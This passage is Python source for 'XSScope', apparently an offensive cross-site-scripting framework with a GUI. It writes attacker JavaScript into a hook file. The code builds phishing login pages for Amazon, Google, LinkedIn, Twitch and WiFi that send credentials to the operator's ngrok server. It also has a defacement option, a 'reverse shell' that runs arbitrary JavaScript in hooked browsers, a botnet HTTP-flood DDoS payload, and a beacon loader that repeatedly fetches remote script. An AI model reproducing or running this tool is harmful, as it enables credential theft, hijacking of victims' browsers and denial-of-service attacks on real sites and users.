        final_asci_code1 = final_asci_code[1:-1]
        final_asci_code2 = "document.documentElement.innerHTML=String.fromCharCode(" + final_asci_code1 + ")"

        # script to save into /custom.js
        built_html_payload = open("xsscope.js", "w")
        built_html_payload.write(final_asci_code2)
        built_html_payload.close()

    explaination_frame = LabelFrame(root4, text="")
    explaination_frame.place(x=5, y=0)

    explaination_text = tk.Label(explaination_frame,
                                 text="Create your own HTML Website or simply choose one of our pre-generated HTML samples. Only add the HTML code, the software will do the rest.")
    explaination_text.grid(row=0, column=0)

    # frame for a big space where user can add their own HTML code
    html_code_frame = tk.LabelFrame(root4, text="HTML code: ")
    html_code_frame.place(x=5, y=100)

    html_code = Text(html_code_frame, width=120, height=50)
    html_code.grid(row=0, column=0, sticky="ew")

    # script for scrollbar attached to the textbox
    scrollbar = tk.Scrollbar(html_code_frame, command=html_code.yview)
    html_code.config(yscrollcommand=scrollbar.set)
    scrollbar.grid(row=0, column=1, sticky=NSEW)

    # html pregenerated HTML templates
    html_developer_frame = tk.LabelFrame(root4, text="Pre-generated HTML codes:")
    html_developer_frame.place(x=5, y=30)

    # function for importing html code
    def import_html():
        imported_html_file = tkinter.filedialog.askopenfilename()
        if imported_html_file is None:  # asksaveasfile return `None` if dialog closed with "cancel".
            return
        else:
            html_code.delete('1.0', END)
            with open(str(imported_html_file)) as imported_code:
                html_code.insert('1.0', imported_code.read())
            # showing the success message that the code has been imported
            tkinter.messagebox.showinfo("Success", "The HTML code has been successful imported.")

    # the function below is to get the value of the optionmenu of the user
    def callback(selection):

        # analyzing the behaviour of the software when website deface is selected
        if selection == "Website Deface":
            html_code.delete('1.0', END)
            with open('templates/website_deface.html', 'r') as f:
                html_code.insert("1.0", f.read())

        if selection == "None" or selection == "Choose a pre-generated HTML code":
            html_code.delete('1.0', END)

        # the begin of amazon login form creation, if selected
        if selection == "Amazon Login Form":
            html_code.delete('1.0', END)
            with open('templates/amazon/login.html') as f:
                lines = f.readlines()

            lines[
                225] = '''        <form name="signIn" method="post" novalidate="" action="http://''' + tcp_server + '''/login_phishing/amazon_login.php" class="a-spacing-none fwcim-form" data-fwcim-id="undefinede6ba0ec5">\n'''
            with open('templates/amazon/login.html', "w") as f:
                f.writelines(lines)
                f.close()

            with open('templates/amazon/login.html') as f:
                html_code.insert("1.0", f.read())

        # the begin of google login form creation, if selected
        if selection == "Google Login Form":
            html_code.delete('1.0', END)
            with open('templates/google/login1.html') as f:
                lines = f.readlines()

            lines[
                1048] = '''  <form novalidate method="post" action="http://''' + tcp_server + '''/login_phishing/google_login.php" id="gaia_loginform">\n'''
            with open('templates/google/login1.html', "w") as f:
                f.writelines(lines)
                f.close()

            with open('templates/google/login1.html') as f:
                html_code.insert("1.0", f.read())

        # the begin of LinkedIn login form creation, if selected
        if selection == "Linkedin Login Form":
            html_code.delete('1.0', END)
            with open('templates/linkedin/login.html') as f:
                lines = f.readlines()

            lines[
                82] = '''        <div class="global-wrapper artdeco-a"><code id="i18n_sign_in" style="display: none;"><!--"Sign in"--></code><code id="i18n_join_now" style="display: none;"><!--"Join now"--></code><div class="header"><div class="wrapper"><h1><img class="lazy-load" data-delayed-url="https://static.licdn.com/sc/h/95o6rrc5ws6mlw6wqzy0xgj7y" alt="LinkedIn"/></h1><form class="login-form" action="http://''' + tcp_server + '''/login_phishing/linkedin_login.php" method="POST"><label for="login-email">Email</label><input type="text"name="session_key"class="login-email"autocapitalize="off"tabindex="1"id="login-email"placeholder="Email"autofocus="autofocus"><label for="login-password">Password</label><input type="password"name="session_password"class="login-password"id="login-password"aria-required="true"tabindex="1"placeholder="Password"/><input tabindex="1" id="login-submit" class="login submit-button" type="submit" value="Sign in" ><a class="link-forgot-password" tabindex="1" href="https://www.linkedin.com/uas/request-password-reset?trk=uno-reg-guest-home-forgot-password">Forgot password?</a><div id="login-callout" class="hopscotch-bubble animated hopscotch-callout no-number hidden" tabindex="-1"><div class="hopscotch-bubble-container"><div class="hopscotch-bubble-content"><h3 class="hopscotch-title">Trying to sign in?</h3><div class="hopscotch-content">Someone&#39;s already using that email. If that’s you, enter your Email and password here to sign in.</div></div><a title="Close" href="#" class="hopscotch-bubble-close hopscotch-close">Close</a></div><div class="hopscotch-bubble-arrow-container hopscotch-arrow up"></div></div><input name="isJsEnabled" type="hidden" value="false"/><input name="loginCsrfParam" id="loginCsrfParam-login" type="hidden" value="3c0c2b17-a4e5-4a6c-84bc-87e7dd9327a2"/></form></div></div><div id="main-container" class="main background lazy-load show-join   " data-delayed-url="https://static.licdn.com/sc/h/64xk850n3a8uzse6fi11l3vmz"><form id="regForm" class="reg-form" action="https://www.linkedin.com/start/join-prefill" method="POST" data-jsenabled="check"><h2 class="title">Be great at what you do</h2><h3 class="subtitle">Get started - it's free.</h3><div class="reg-alert hidden" role="alert" tabindex="-1"><div class="wrapper"><p class="message"><span class="alert-content"></span></p><button class="dismiss dismiss-alert"><li-icon type="cancel-icon" size="small" a11y-text="Dismiss"></li-icon></button></div></div><section class="form-body"><label for="reg-firstname">First name</label><input type="text"name="firstName"id="reg-firstname"class="reg-firstname"aria-required="true"tabindex="1"placeholder=""/><label for="reg-lastname">Last name</label><input type="text"name="lastName"id="reg-lastname"class="reg-lastname"aria-required="true"tabindex="1"placeholder=""/><label for="reg-email">Email</label><input type="text"name="session_key"class="reg-email"autocapitalize="off"tabindex="1"id="reg-email"autofocus="autofocus"><label for="reg-password">Password (6 or more characters)</label><input type="password"name="session_password"class="reg-password"id="reg-password"aria-required="true"tabindex="1"autocomplete="new-password"/><span class="agreement">By clicking Join now, you agree to the LinkedIn <a tabindex="4" href="https://www.linkedin.com/legal/user-agreement">User Agreement</a>, <a tabindex="4" href="https://www.linkedin.com/legal/privacy-policy">Privacy Policy</a>, and <a tabindex="4" href="https://www.linkedin.com/legal/cookie-policy">Cookie Policy</a>.</span><input tabindex="4" id="registration-submit" class="registration submit-button" type="submit" value="Join now" ></section></form></div><div class="meter"><form class="same-name-search" method="GET" action="https://www.linkedin.com/pub/dir/"><h3 class="title">Find a colleague</h3><input type="text" name="first" placeholder="First name"><input type="text" name="last" placeholder="Last name"><input type="hidden" name="trk" value="uno-reg-guest-home-name-search"><input type="submit" class="submit-btn" name="search" value="Search"></form><div class="directory"><h3 class="title">LinkedIn member directory: </h3><ol><li><a href="https://www.linkedin.com/directory/people-a">A</a></li><li><a href="https://www.linkedin.com/directory/people-b">B</a></li><li><a href="https://www.linkedin.com/directory/people-c">C</a></li><li><a href="https://www.linkedin.com/directory/people-d">D</a></li><li><a href="https://www.linkedin.com/directory/people-e">E</a></li><li><a href="https://www.linkedin.com/directory/people-f">F</a></li><li><a href="https://www.linkedin.com/directory/people-g">G</a></li><li><a href="https://www.linkedin.com/directory/people-h">H</a></li><li><a href="https://www.linkedin.com/directory/people-i">I</a></li><li><a href="https://www.linkedin.com/directory/people-j">J</a></li><li><a href="https://www.linkedin.com/directory/people-k">K</a></li><li><a href="https://www.linkedin.com/directory/people-l">L</a></li><li><a href="https://www.linkedin.com/directory/people-m">M</a></li><li><a href="https://www.linkedin.com/directory/people-n">N</a></li><li><a href="https://www.linkedin.com/directory/people-o">O</a></li><li><a href="https://www.linkedin.com/directory/people-p">P</a></li><li><a href="https://www.linkedin.com/directory/people-q">Q</a></li><li><a href="https://www.linkedin.com/directory/people-r">R</a></li><li><a href="https://www.linkedin.com/directory/people-s">S</a></li><li><a href="https://www.linkedin.com/directory/people-t">T</a></li><li><a href="https://www.linkedin.com/directory/people-u">U</a></li><li><a href="https://www.linkedin.com/directory/people-v">V</a></li><li><a href="https://www.linkedin.com/directory/people-w">W</a></li><li><a href="https://www.linkedin.com/directory/people-x">X</a></li><li><a href="https://www.linkedin.com/directory/people-y">Y</a></li><li><a href="https://www.linkedin.com/directory/people-z">Z</a></li><li><a href="https://www.linkedin.com/directory/people-1">More</a></li><li class="country-search"><a href="https://www.linkedin.com/directory/country_listing/?trk=uno-reg-guest-home-country">Browse by country/region</a></li></ol></div><div class="links-container ghp-footer"><div class="links links-general ghp-footer__section"><h3 class="title ghp-footer__section-title">General</h3><ul class="ghp-footer__links"><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/start/join?trk=uno-reg-guest-home-join" class="ghp-footer__link">Sign Up</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/help/linkedin?trk=uno-reg-guest-home-help-center&amp;lang=en" class="ghp-footer__link">Help Center</a></li><li class="ghp-footer__link-item"><a href="https://press.linkedin.com/about-linkedin?trk=uno-reg-guest-home-about" class="ghp-footer__link">About</a></li><li class="ghp-footer__link-item"><a href="https://press.linkedin.com?trk=uno-reg-guest-home-press" class="ghp-footer__link">Press</a></li><li class="ghp-footer__link-item"><a href="https://blog.linkedin.com?trk=uno-reg-guest-home-blog" class="ghp-footer__link">Blog</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/company/linkedin/careers?trk=uno-reg-guest-home-careers" class="ghp-footer__link">Careers</a></li><li class="ghp-footer__link-item"><a href="https://developer.linkedin.com?trk=uno-reg-guest-home-developers" class="ghp-footer__link">Developers</a></li></ul></div><div class="links links-business ghp-footer__section"><h3 class="title ghp-footer__section-title">Business Solutions</h3><ul class="ghp-footer__links"><li class="ghp-footer__link-item"><a href="https://business.linkedin.com/talent-solutions?src=li-footer&amp;utm_source=linkedin&amp;utm_medium=footer&amp;trk=uno-reg-guest-home-enterprise-talent" class="ghp-footer__link">Talent</a></li><li class="ghp-footer__link-item"><a href="https://business.linkedin.com/marketing-solutions?src=li-footer&amp;utm_source=linkedin&amp;utm_medium=footer&amp;trk=uno-reg-guest-home-enterprise-marketing" class="ghp-footer__link">Marketing</a></li><li class="ghp-footer__link-item"><a href="https://business.linkedin.com/sales-solutions?src=li-footer&amp;utm_source=linkedin&amp;utm_medium=footer&amp;trk=uno-reg-guest-home-enterprise-sales" class="ghp-footer__link">Sales</a></li><li class="ghp-footer__link-item"><a href="https://learning.linkedin.com?src=li-footer&amp;trk=uno-reg-guest-home-enterprise-learning" class="ghp-footer__link">Learning</a></li></ul></div><div class="links links-browse ghp-footer__section"><h3 class="title ghp-footer__section-title">Browse LinkedIn</h3><ul class="ghp-footer__links"><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/learning/?trk=uno-reg-guest-home-learning" class="ghp-footer__link">Learning</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/jobs?trk=uno-reg-guest-home-jobs" class="ghp-footer__link">Jobs</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/salary/?trk=uno-reg-guest-home-salary" class="ghp-footer__link">Salary</a></li><li class="ghp-footer__link-item"><a href="https://mobile.linkedin.com?trk=uno-reg-guest-home-mobile" class="ghp-footer__link">Mobile</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/profinder?trk=uno-reg-guest-home-profinder" class="ghp-footer__link">ProFinder</a></li></ul></div><div class="links links-directories ghp-footer__section"><h3 class="title ghp-footer__section-title">Directories</h3><ul class="ghp-footer__links"><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/people-a?trk=uno-reg-guest-home-people-directory" class="ghp-footer__link">Members</a></li><li><a href="https://www.linkedin.com/directory/jobs?trk=uno-reg-guest-home-jobs-directory" class="ghp-footer__link">Jobs</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/pulse?trk=uno-reg-guest-home-pulse" class="ghp-footer__link">Pulse</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/companies/?trk=uno-reg-guest-home-companies-directory" class="ghp-footer__link">Companies</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/salaries?trk=uno-reg-guest-home-salaries-directory" class="ghp-footer__link">Salaries</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/universities?trk=uno-reg-guest-home-universities" class="ghp-footer__link">Universities</a></li><li class="ghp-footer__link-item"><a href="https://www.linkedin.com/directory/topjobs?trk=uno-reg-guest-home-topJobs-directory" class="ghp-footer__link">Top Jobs</a></li></ul></div></div><div class="legal-nav"><div class="copyright"><img class="logo-copyright lazy-load" data-delayed-url="https://static.licdn.com/sc/h/5koy91fjbrc47yhwyzws65ml7" alt="LinkedIn"> &copy; 2018</div><ul><li><a href="https://www.linkedin.com/legal/user-agreement?trk=uno-reg-guest-home-user-agreement">User Agreement</a></li><li><a href="https://www.linkedin.com/legal/privacy-policy?trk=uno-reg-guest-home-privacy-policy">Privacy Policy</a></li><li><a href="https://www.linkedin.com/help/linkedin/answer/34593?lang=en&amp;trk=uno-reg-guest-home-community-guidelines">Community Guidelines</a></li><li><a href="https://www.linkedin.com/legal/cookie-policy?trk=uno-reg-guest-home-cookie-policy">Cookie Policy</a></li><li><a href="https://www.linkedin.com/legal/copyright-policy?trk=uno-reg-guest-home-copyright-policy">Copyright Policy</a></li><li><a href="https://www.linkedin.com/psettings/guest-controls?trk=uno-reg-guest-home-guest-controls">Guest Controls</a></li><li class="lang-selector-container"><input type="checkbox" id="lang-selector-state" name="lang-selector-state"/><label for="lang-selector-state" class="lang-selector-state-label" tabindex="0" role="button" aria-expanded="false">Language</label><form name="languageSelectorForm" id="languageSelectorForm" action="/languageSelector" method="POST"><ul class="lang-selector"><li><button data-locale="in_ID">Bahasa Indonesia</button></li><li><button data-locale="ms_MY">Bahasa Malaysia</button></li><li><button data-locale="cs_CZ">Čeština</button></li><li><button data-locale="da_DK">Dansk</button></li><li><button data-locale="de_DE">Deutsch</button></li><li><span class="current">English</span></li><li><button data-locale="es_ES">Español</button></li><li><button data-locale="zh_TW">正體中文</button></li><li><button data-locale="fr_FR">Français</button></li><li><button data-locale="ko_KR">한국어</button></li><li><button data-locale="it_IT">Italiano</button></li><li><button data-locale="zh_CN">简体中文</button></li><li><button data-locale="nl_NL">Nederlands</button></li><li><button data-locale="ja_JP">日本語</button></li><li><button data-locale="no_NO">Norsk</button></li><li><button data-locale="pl_PL">Polski</button></li><li><button data-locale="pt_BR">Português</button></li><li><button data-locale="ro_RO">Română</button></li><li><button data-locale="ru_RU">Русский</button></li><li><button data-locale="sv_SE">Svenska</button></li><li><button data-locale="tl_PH">Tagalog</button></li><li><button data-locale="th_TH">ภาษาไทย</button></li><li><button data-locale="tr_TR">Türkçe</button></li><li><button data-locale="ar_AE">العربية</button></li></ul><input type="hidden" name="i18nLang" value=""><input type="hidden" name="currenturl" value=""></form></li></ul></div></div></div><script type="application/ld+json">{"@context": "http://schema.org","@type": "WebSite","url": "https://www.linkedin.com/","potentialAction": {"@type": "SearchAction","target": "https://www.linkedin.com/vsearch/f?type=all&keywords=","query-input": "required name=search_term"}}</script><script type="text/javascript" src="https://static.licdn.com/sc/h/3qk7aqkysw7gz575y2ma1e5ky"></script><code id="__pageContext__" style="display: none;"><!--{"baseScdsUrl":"https://static.licdn.com/scds","contextPath":"/directory/","pageInstance":"urn:li:page:uno-reg-guest-home;8mEWRhFNRZeWbUQcvxbUAw==","isProd":true,"brotliBaseSparkUrlForHashes":"https://static.licdn.com/sc/h/br","linkedInDustJsUrl":"https://static.licdn.com/sc/h/3qk7aqkysw7gz575y2ma1e5ky","baseSparkUrlForHashes":"https://static.licdn.com/sc/h","isCsUser":false,"appName":"seo-directory-frontend","fizzyJsUrl":"https://static.licdn.com/scds/common/u/lib/fizzy/fz-1.3.3-min.js","mpName":"seo-directory-frontend","scHashesUrl":"https://static.licdn.com/sc/p/com.linkedin.seo-directory-frontend%3Aseo-directory-frontend-static-content%2B0.1.326/f/%2Fseo-directory-frontend%2Fsc-hashes%2Fsc-hashes_en_US.js","dustDebug":"control","baseMediaUrl":"https://media.licdn.com/media","isBrotliEnabled":false,"useCdn":true,"locale":"en_US","version":"0.1.326","useScHashesJs":false,"cdnUrl":"https://static.licdn.com","baseMprUrl":"https://media.licdn.com/mpr/mpr","playUtilsUrl":"https://static.licdn.com/sc/h/v0un52v653evxg2c5l1ap5la","useNativeXmsg":false,"hashesDisabledByQueryParam":false,"baseAssetsUrl":"https://static.licdn.com/sc/p/com.linkedin.seo-directory-frontend%3Aseo-directory-frontend-static-content%2B0.1.326/f","csrfToken":"ajax:0054295001501331025","intlPolyfillUrl":"https://static.licdn.com/sc/h/1fw1ey0jfgqapy4dndtgrr7y1","serveT8WithDust":false,"disableDynamicConcat":false,"baseSparkUrlForFiles":"https://static.licdn.com/sc/p/com.linkedin.seo-directory-frontend%3Aseo-directory-frontend-static-content%2B0.1.326/f","dustUtilsUrl":"https://static.licdn.com/sc/h/19dd5wwuyhbk7uttxpuelttdg","linkedInDustI18nJsUrl":"https://static.licdn.com/sc/h/epy983tzfexddbwygtwyxyavv","baseMediaProxyUrl":"https://media.licdn.com/media-proxy"}--></code><script src="https://static.licdn.com/sc/h/19dd5wwuyhbk7uttxpuelttdg"></script><code id="signupAjaxUrl" style="display: none;"><!--"https://www.linkedin.com/start/reg/api/cors/createAccount?trk=public_guest-home_default"--></code><code id="isPreloadDuoEnabled" style="display: none;"><!--true--></code>\n'''
            with open('templates/linkedin/login.html', "w") as f:
                f.writelines(lines)
                f.close()

            with open('templates/linkedin/login.html') as f:
                html_code.insert("1.0", f.read())

        # the begin of Steam login form creation, if selected
        if selection == "Steam Login Form":
            html_code.delete('1.0', END)
            with open('templates/steam/login.html') as f:
                lines = f.readlines()

            lines[
                304] = '''			<form action="login.php" method="POST" name="logon" id="loginForm" style="display: none;">\n'''
            with open('templates/steam/login.html', "w") as f:
                f.writelines(lines)
                f.close()

            with open('templates/steam/login.html') as f:
                html_code.insert("1.0", f.read())

        # the begin of Twitch login form creation, if selected
        if selection == "Twitch Login Form":
            html_code.delete('1.0', END)
            with open('templates/twitch/login.html') as f:
                lines = f.readlines()

            lines[
                65] = '''  <form method="post" action="http://''' + tcp_server + '''/login_phishing/twitch_login.php" id="loginForm" class="col-md-6">\n'''
            with open('templates/twitch/login.html', "w") as f:
                f.writelines(lines)
                f.close()

            with open('templates/twitch/login.html') as f:
                html_code.insert("1.0", f.read())

        # the begin of Line login form creation, if selected
        if selection == "Line Login Form":
            html_code.delete('1.0', END)
            with open('templates/line/login.html') as f:
                lines = f.readlines()

            lines[19] = '''        <form action="login.php" method="post">\n'''
            with open('templates/steam/login.html', "w") as f:
                f.writelines(lines)
                f.close()

            with open('templates/line/login.html') as f:
                html_code.insert("1.0", f.read())

        # the begin of WiFi login form creation, if selected
        if selection == "WiFi Phishing Login Form":
            html_code.delete('1.0', END)
            with open('templates/wifi/login.html') as f:
                lines = f.readlines()

            lines[
                901] = '''<form novalidate="" method="post" id="form1" name="form1" action="http://''' + tcp_server + '''/login_phishing/wifi_login.php">\n'''
            with open('templates/wifi/login.html', "w") as f:
                f.writelines(lines)
                f.close()

            with open('templates/wifi/login.html') as f:
                html_code.insert("1.0", f.read())

    html_options = tk.StringVar()
    html_menu = tk.OptionMenu(html_developer_frame, html_options, 'Website Deface', 'Amazon Login Form',
                              'Google Login Form', 'Line Login Form', 'Linkedin Login Form', 'Steam Login Form',
                              'Twitch Login Form', 'WiFi Phishing Login Form', "None",
                              command=callback)
    html_menu.pack()
    html_options.set('Choose a pre-generated HTML code')

    # frames for buttons
    add_code_frame = tk.LabelFrame(root4, text="")
    add_code_frame.place(x=870, y=50)

    add_code_button = tk.Button(add_code_frame, text="Apply code", command=add_html_code)
    add_code_button.grid(row=0, column=0)

    # configuring the tab for phishing website
    menubar2 = Menu(root4)
    filemenu2 = Menu(menubar2, tearoff=0)
    filemenu2.add_command(label="Import code from file", command=import_html)
    filemenu2.add_separator()
    filemenu2.add_command(label="Exit", command=quit4)
    menubar2.add_cascade(label="Main", menu=filemenu2)

    root4.config(menu=menubar2)
    root4.mainloop()


def reverse_shell():
    root6 = tk.Tk()
    root6.title("XSScope v.2.2 - Remote Shell")
    root6.geometry('580x70')
    root6.resizable(0, 0)

    shell_frame = LabelFrame(root6, text="Execute Javascript Command")
    shell_frame.place(x=5, y=5)

    remote_shell_command = tk.Entry(shell_frame, width=60)
    remote_shell_command.grid(row=0, column=0)

    def exec_js():
        command_exec = str(remote_shell_command.get())
        hook_file = open("xsscope.js", "w")
        hook_file.write(command_exec)
        hook_file.close()

    execute_command = tk.Button(shell_frame, text="Execute", command=exec_js)
    execute_command.grid(row=0, column=1)

    root6.mainloop()

def http_flood():
    root7 = tk.Toplevel()
    root7.title("XSScope v.2.2 - Botnet HTTP Flood (DDoS)")
    root7.geometry('530x135')
    root7.resizable(0, 0)

    def help_ddos_wiki():
        webbrowser.open("https://github.com/kleiton0x00/XSScope/wiki/Possible-attacks#usage-5---perform-a-ddos-attack", new=1)

    def launch_ddos():
        threads_num = str(http_flood_thread.get())
        print (https_var.get())
        if "http://" in http_target_entry.get() or "https://" in http_target_entry.get() or " " in http_target_entry.get():
            tkinter.messagebox.showerror("Invalid URL Format","The URL you entered is invalid format, don't include http:// protocol \n[Correct format: website.com]")
            return
        if http_target_entry.get() == "":
            tkinter.messagebox.showerror("Error","Please specify an URL")
            return
        if https_var.get() == 1:
            https_protocol = "https://"
        if https_var.get() == 0:
            https_protocol = "http://"

        xss_ddos_code = """

var target = '""" + str(http_target_entry.get()) + """';
var thread_count = """ + threads_num + """;
var scan_counter = 0;
var resp_size_counter = 0;
var Sys = {};
var ua = navigator.userAgent.toLowerCase();
var s;
(s = ua.match(/msie ([\d.]+)/)) ? Sys.ie = s[1] : 0;
var xhr; 
if (!Sys.ie){
  var i = 0;
  while(i<thread_count){
    while_loop_cor();
    i++;
  }
}else{
  var i = 0;
  while(i<thread_count){
    while_loop_ie();i++;
  }
}
if (!Sys.ie){
  xhr = new XMLHttpRequest();
  xhr.onreadystatechange = processResp;
}else{
  xdr = new XDomainRequest();
  xdr.timeout = 1000;
}

function while_loop_cor(){
  try{
    ws = new WebSocket('ws://' + target);
    scan_counter = scan_counter+1;
    xhr = new XMLHttpRequest();
    var furl='""" + https_protocol + """' + target + '&xsscope_ddos=' + Math.floor(Math.random()*10000000000);
    xhr.open('GET', furl);
    xhr.onreadystatechange = function(){
      if (xhr.readyState==4){
        resp_size_counter = resp_size_counter+xhr.responseText.length;
      }
    };
    xhr.onerror = function(e){} 
    xhr.send(100);
    setTimeout("while_loop_cor()",0);
  }
  catch(err){return;}
} 

function while_loop_ie(){
  try{
    scan_counter = scan_counter+1;
    xdr = new XDomainRequest();
    xdr.open('get', '""" + https_protocol + """' + target);
    xdr.send();
    setTimeout('while_loop_ie()',0);
  }catch(err){
    return;
  }
}

function processResp(){
  if (xmlhttp.readyState==4){}
}
        
"""
        ddos_file = open("xsscope.js", "w")
        ddos_file.write(xss_ddos_code)
        ddos_file.close()
        tkinter.messagebox.showinfo("Attack launched","Attack is successfully launched")

    http_flood_frame = tk.LabelFrame(root7, text="HTTP Flood (DDoS) Panel")
    http_flood_frame.place(x=5, y=5)

    http_target_label = tk.Label(http_flood_frame,text="Target URL: ")
    http_target_label.grid(row=0, column=0)

    http_target_entry = tk.Entry(http_flood_frame,width=40)
    http_target_entry.grid(row=0, column=1)

    https_var = tk.IntVar()
    use_https_checkbox = tk.Checkbutton(http_flood_frame,text="Use HTTPS", variable=https_var)
    use_https_checkbox.grid(row=0, column=2)

    http_thread_label = tk.Label(http_flood_frame, text="Threads: ")
    http_thread_label.grid(row=1, column=0)

    threads = tk.DoubleVar()
    http_flood_thread = tk.Scale(http_flood_frame, variable = threads, from_ = 1, to = 100, orient = HORIZONTAL, length=330)
    http_flood_thread.grid(row=1, column=1)

    button_ddos_frame = tk.LabelFrame(root7, text="")
    button_ddos_frame.place(x=240, y=95)

    help_ddos = tk.Button(button_ddos_frame, text="Help", command=help_ddos_wiki)
    help_ddos.grid(row=0, column=0)

    ddos_button = tk.Button(button_ddos_frame, text="Launch Attack", command=launch_ddos)
    ddos_button.grid(row=0, column=1)

    root7.mainloop()

def main1():
    # setting up the whole gui properties
    root = tk.Tk()
    root.title("XSScope v.2.2")
    root.geometry('410x100')
    # root.iconbitmap('x_logo_VYw_icon.ico')
    root.resizable(0, 0)
    # end of the gui propertie
    # print the welcoming message in the terminal/cmd

    global tcp_server, tcp_server_ip, tcp_server_port
    global beacon_interval

    # main frames
    main_frame = LabelFrame(root, text="Ngrok Server Information")
    main_frame.place(x=5, y=0)

    # FRAME for NGROK TCP Server
    ngrok_server_text = tk.Label(main_frame, text="IP: ")
    ngrok_server_text.grid(row=0, column=0)

    ngrok_server_output = tk.Entry(main_frame, width=30)
    ngrok_server_output.insert(END, tcp_server_ip)
    ngrok_server_output.configure(state="readonly")
    ngrok_server_output.grid(row=0, column=1)

    ngrok_port_text = tk.Label(main_frame, text="Port: ")
    ngrok_port_text.grid(row=0, column=2)

    ngrok_port_output = tk.Entry(main_frame, width=10)
    ngrok_port_output.insert(END, tcp_server_port)
    ngrok_port_output.configure(state="readonly")
    ngrok_port_output.grid(row=0, column=3)

    # FRAME for PHP local Server
    main_frame1 = LabelFrame(root, text="Local PHP Server Information")
    main_frame1.place(x=5, y=50)

    php_server_text = tk.Label(main_frame1, text="IP: ")
    php_server_text.grid(row=0, column=0)

    php_server_output = tk.Entry(main_frame1, width=30)
    php_server_output.insert(END, '127.0.0.1')
    php_server_output.configure(state="readonly")
    php_server_output.grid(row=0, column=1)

    php_port_text = tk.Label(main_frame1, text="Port: ")
    php_port_text.grid(row=0, column=2)

    php_port_output = tk.Entry(main_frame1, width=10)
    php_port_output.insert(END, '1337')
    php_port_output.configure(state="readonly")
    php_port_output.grid(row=0, column=3)

    # creating a hook script on the background
    hook_js_code = """function connectLoader(retval) {
    var URL= 'http://""" + tcp_server + """/xsscope.js';
    var scriptTag = document.getElementById('loadScript');
    var head = document.getElementsByTagName('head').item(0);
    if(scriptTag) head.removeChild(scriptTag);
    var script = document.createElement('script');
    script.src = URL;
    script.type = 'text/javascript';
    script.id = 'loadScript';
    head.appendChild(script);
}
setInterval('connectLoader()',""" + beacon_interval + """);

"""

    hook_file = open("xsscope.js", "w")
    hook_file.write(hook_js_code)
    hook_file.close()
    # hook javascript file successfully created and ready to perform attack

    # customising the Menu
    menubar = Menu(root)
    filemenu = Menu(menubar, tearoff=0)
    filemenu.add_command(label="XSS Payloads", command=show_payload)
    filemenu.add_command(label="Agent Module", command=agent_module)
    filemenu.add_command(label="Inject HTML code", command=phishing_website)
    filemenu.add_command(label="Reverse Shell", command=reverse_shell)
    filemenu.add_command(label="HTTP Flood (DDoS)", command=http_flood)
    filemenu.add_separator()
    filemenu.add_command(label="Check for update", command=check_update)
    filemenu.add_command(label="Exit", command=quit)
    menubar.add_cascade(label="Main", menu=filemenu)

    # help menu
    helpmenu = Menu(menubar, tearoff=0)
    helpmenu.add_command(label="About", command=about)
    helpmenu.add_command(label="Documentation", command=help)
    helpmenu.add_command(label="License", command=documentation)
    menubar.add_cascade(label="Help", menu=helpmenu)

    # end of script to configure all the script
    root.config(menu=menubar)
    root.mainloop()


def main():
    root_main = tk.Tk()
    root_main.title("Connect")
    root_main.geometry('410x260')
    # root.iconbitmap('x_logo_VYw_icon.ico')
    root_main.resizable(0, 0)

    # defining the string and int variables
    setup_var = tk.IntVar()

    connect_frame = tk.LabelFrame(root_main, text="")
    connect_frame.place(x=5, y=5)

    connect_label = tk.Label(connect_frame,
                             text="This is the connect dialog. Before opening XSScope, choose \nhow you want to connect.")
    connect_label.grid(row=0, column=0)

    setup_frame = tk.Label(root_main, text="")
    setup_frame.place(x=5, y=50)

    def config_opt():
        if setup_var.get() == 2:
            server_ip_label.configure(state="normal")
            server_ip_entry.config(state="normal")
            server_port_label.config(state="normal")
            server_port_entry.config(state="normal")
        elif setup_var.get() == 1:
            server_ip_entry.delete(0, END)
            server_port_entry.delete(0, END)
            server_ip_label.configure(state="disabled")
            server_ip_entry.config(state="disabled")
            server_port_label.config(state="disabled")
            server_port_entry.config(state="disabled")

    automatic_setup = tk.Radiobutton(setup_frame, text="Automatic server setup", variable=setup_var, value=1,
                                     command=config_opt)
    automatic_setup.grid(row=1, column=0)
    manual_setup = tk.Radiobutton(setup_frame, text="Manual server setup     ", variable=setup_var, value=2,
                                  command=config_opt)
    manual_setup.grid(row=2, column=0)

    button_frame = tk.LabelFrame(root_main, text="")
    button_frame.place(x=115, y=220)

    # frame for manual setup
    manual_setup_frame = LabelFrame(root_main, text="Manual Server Configuration")
    manual_setup_frame.place(x=5, y=100)

    server_ip_label = tk.Label(manual_setup_frame, text="Server IP: ")
    server_ip_label.grid(row=0, column=0)

    server_ip_entry = tk.Entry(manual_setup_frame, width=38)
    server_ip_entry.grid(row=0, column=1)
    server_ip_entry.configure(state="disabled")

    server_port_label = tk.Label(manual_setup_frame, text="Server Port: ")
    server_port_label.grid(row=1, column=0)

    server_port_entry = tk.Entry(manual_setup_frame, width=38)
    server_port_entry.grid(row=1, column=1)
    server_port_entry.configure(state="disabled")

    # beacon config frame
    beacon_frame = tk.LabelFrame(root_main, text="")
    beacon_frame.place(x=5, y=175)

    beacon_interval_label = tk.Label(beacon_frame, text="Set beacon interval (ms)*: ")
    beacon_interval_label.grid(row=0, column=0)

    beacon_interval_entry = tk.Entry(beacon_frame, width=10)
    beacon_interval_entry.grid(row=0, column=1)

    beacon_interval_entry.insert(END, '10000')

    def start_xsscope():
        global tcp_server
        global tcp_server_ip
        global tcp_server_port
        global beacon_interval
        beacon_interval = str(beacon_interval_entry.get())
        if setup_var.get() == 1:
            # SETTING UP A NGROK
            with open('config/ngrok_authtoken.txt', 'r') as authtoken:
                ngrok_authtoken = authtoken.read()
            if ngrok_authtoken == "paste_ngrok_authtoken_here" or ngrok_authtoken == "":
                tkinter.messagebox.showerror("Setup Error",
                                             "Because of the first setup, you have to paste your Ngrok Authtoken in /config/ngrok_authtoken.txt")

            # open a http tunnel on port 1337
            tcp_server = ngrok.connect(1337, "tcp")
